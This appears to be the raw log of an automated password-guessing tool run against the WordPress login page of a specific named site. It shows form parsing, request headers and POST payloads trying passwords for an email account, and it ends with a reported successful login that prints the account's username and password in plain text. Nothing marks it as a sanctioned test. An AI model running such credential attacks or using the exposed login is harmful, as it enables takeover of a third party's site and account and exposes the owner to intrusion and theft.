INFO:root:random password generated: Tf|U/QgTJx
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:random password generated: ,{O!|`I%}*
INFO:root:username_element: log
INFO:root:password_element: pwd
INFO:root:{
  "url": "https://alqlambara.com/qemam/wp-login.php",
  "pass_user": "pass_user.csv",
  "params_list": {
    "password_param": [
      "password"
    ],
    "user_param": [
      "username",
      "email",
      "log",
      "id"
    ],
    "ButtonList": [
      "login",
      "sign in"
    ]
  }
}
INFO:root:{
  "button_attr": "input[type=submit][name=wp-submit][id=wp-submit][class=button\\ button-primary\\ button-large][value=\u062f\u062e\u0648\u0644]",
  "form": "<form action=\"https://alqlambara.com/qemam/wp-login.php\" id=\"loginform\" method=\"post\" name=\"loginform\">\n<p>\n<label for=\"user_login\" id=\"user_label\"></label>\n<input autocapitalize=\"none\" class=\"input\" id=\"user_login\" name=\"log\" placeholder=\"Email Address\" size=\"20\" type=\"text\" value=\"\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\" id=\"pass_label\"><span class=\"label-switch\"></span></label>\n<div class=\"wp-pwd\">\n<input class=\"input password-input\" id=\"user_pass\" name=\"pwd\" placeholder=\"Password\" size=\"20\" type=\"password\" value=\"\"/>\n<button aria-label=\"\u0639\u0631\u0636 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" type=\"button\">\n<span aria-hidden=\"true\" class=\"dashicons dashicons-visibility\"></span>\n</button>\n</div>\n</div>\n<p class=\"forgetmenot\"><input class=\"checkbox\" id=\"rememberme\" name=\"rememberme\" style=\"opacity: 0;\" type=\"checkbox\" value=\"forever\"/><span class=\"checkbox\"></span> <label for=\"rememberme\">\u062a\u0630\u0643\u0631\u0646\u064a</label></p><p class=\"lostmenot\"><a href=\"https://alqlambara.com/qemam/wp-login.php?action=lostpassword\">\u0647\u0644 \u0646\u0633\u064a\u062a \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631\u061f</a></p>\n<p class=\"submit\">\n<input class=\"button button-primary button-large\" id=\"wp-submit\" name=\"wp-submit\" type=\"submit\" value=\"\u062f\u062e\u0648\u0644\"/>\n<input name=\"redirect_to\" type=\"hidden\" value=\"https://alqlambara.com/qemam/wp-admin/\"/>\n<input name=\"testcookie\" type=\"hidden\" value=\"1\"/>\n</p>\n</form>",
  "user_param": "log",
  "password_param": "pwd",
  "contentLen": 360.0,
  "status_code": 200,
  "post_data": {
    "log": "m7mdassi",
    "wp-submit": "\u062f\u062e\u0648\u0644",
    "redirect_to": "https://alqlambara.com/qemam/wp-admin/",
    "testcookie": "1"
  },
  "method": "POST",
  "action": "https://alqlambara.com/qemam/wp-login.php",
  "headers": {
    "host": "alqlambara.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.5",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://alqlambara.com/qemam/wp-login.php",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://alqlambara.com",
    "alt-used": "alqlambara.com",
    "connection": "keep-alive",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1"
  },
  "req_body_type": "URL_ENCODED"
}
INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1', 'pwd': 'asdasd'}
INFO:root: max_similarity: 0.8767379679144385
INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1', 'pwd': 'astmamsh123'}
INFO:root:[check_login] Status code changed!: 302
INFO:root:login successfull

username: alqlambara@gmail.com
password: astmamsh123
